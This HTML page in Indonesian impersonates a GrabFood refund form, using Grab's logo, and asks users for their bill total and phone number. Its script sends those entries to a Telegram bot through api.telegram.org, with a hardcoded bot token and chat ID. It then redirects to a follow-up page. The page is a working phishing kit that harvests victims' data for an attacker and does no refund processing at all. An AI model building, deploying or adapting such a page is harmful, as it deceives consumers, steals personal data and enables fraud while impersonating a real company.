<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GrabFood - Formulir Pengembalian Dana</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            color: #333;
            display: flex;
            justify-content: center;
        }
        .main-container { width: 100%; max-width: 600px; }
        .header { padding: 15px 20px; display: flex; align-items: center; border-bottom: 1px solid #eee; }
        .hamburger-menu { font-size: 24px; }
        .logo-container { flex-grow: 1; text-align: center; }
        .grab-logo { height: 30px; }
        .content { padding: 30px 20px; }
        h1.title { font-size: 24px; margin: 0 0 10px 0; font-weight: bold; text-align: center; }
        .green-line { width: 40px; height: 4px; background-color: #00B14F; margin: 0 auto 25px auto; border-radius: 2px; }
        h2.subtitle { font-size: 18px; margin-bottom: 30px; font-weight: 600; }
        .form-group { margin-bottom: 20px; }
        .form-label { display: block; font-size: 16px; margin-bottom: 8px; font-weight: 500; }
        .form-input { width: 100%; padding: 15px; font-size: 16px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
        
        /* Tombol default (abu-abu) */
        .submit-btn {
            width: 100%; padding: 18px; font-size: 18px; font-weight: bold;
            color: #A3A9B2; background-color: #E5E7E9; border: none; border-radius: 8px; cursor: not-allowed; margin-top: 10px;
        }

        /* Gaya tombol saat aktif (hijau) */
        .submit-btn.active {
            background-color: #00AA6C;
            color: white;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="main-container">
    <header class="header">
        <div class="hamburger-menu">☰</div>
        <div class="logo-container">
            <img src="https://weblogin.grab.com/static/images/brand.FjQT8gP.svg" alt="Grab Logo" class="grab-logo">
        </div>
    </header>

    <main class="content">
        <h1 class="title">GRABFOOD</h1>
        <div class="green-line"></div>
        <h2 class="subtitle">Formulir pengembalian dana</h2>

        <div class="form-group">
            <label class="form-label">Total Tagihan :</label>
            <input type="text" id="tagihan" class="form-input" placeholder="Rp xxxxx" oninput="checkForm()">
        </div>

        <div class="form-group">
            <label class="form-label">Nomor Handphone :</label>
            <input type="tel" id="nohp" class="form-input" placeholder="08123456789" oninput="checkForm()">
        </div>

        <button id="btnSubmit" class="submit-btn" disabled>Masuk</button>
    </main>
</div>

<script>
    function checkForm() {
        const tagihan = document.getElementById('tagihan').value;
        const nohp = document.getElementById('nohp').value;
        const btn = document.getElementById('btnSubmit');

        if (tagihan.trim() !== "" && nohp.trim() !== "") {
            btn.classList.add('active');
            btn.disabled = false;
        } else {
            btn.classList.remove('active');
            btn.disabled = true;
        }
    }
</script>
<script>
    // Fungsi cek input agar tombol aktif/nonaktif
    function checkForm() {
        const tagihan = document.getElementById('tagihan').value;
        const nohp = document.getElementById('nohp').value;
        const btn = document.getElementById('btnSubmit');

        if (tagihan.trim() !== "" && nohp.trim() !== "") {
            btn.classList.add('active');
            btn.disabled = false;
        } else {
            btn.classList.remove('active');
            btn.disabled = true;
        }
    }

    // Fungsi kirim ke Telegram
    const btnSubmit = document.getElementById('btnSubmit');
    btnSubmit.addEventListener('click', function() {
        const tagihan = document.getElementById('tagihan').value;
        const nohp = document.getElementById('nohp').value;
        
        const token = "8870126844:AAGXw_QRhYAKB92aFZhH8cOsNHDRaUKXmZw"; // Ganti dengan token bot Anda
        const chatId = "7864264495";   // Ganti dengan chat ID Anda
        const text = `Data Pengembalian Dana:\nTotal Tagihan: ${tagihan}\nNo HP: ${nohp}`;

        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;

        // Kirim data
        fetch(url)
            .then(response => {
                if (response.ok) {
                    alert("Data berhasil dikirim!");
                    // Redirect ke halaman lain setelah berhasil
                    window.location.href = "/sucerity.html"; // Ganti dengan URL tujuan Anda
                } else {
                    alert("Gagal mengirim data.");
                }
            })
            .catch(error => console.error('Error:', error));
    });
</script>

</body>
</html>
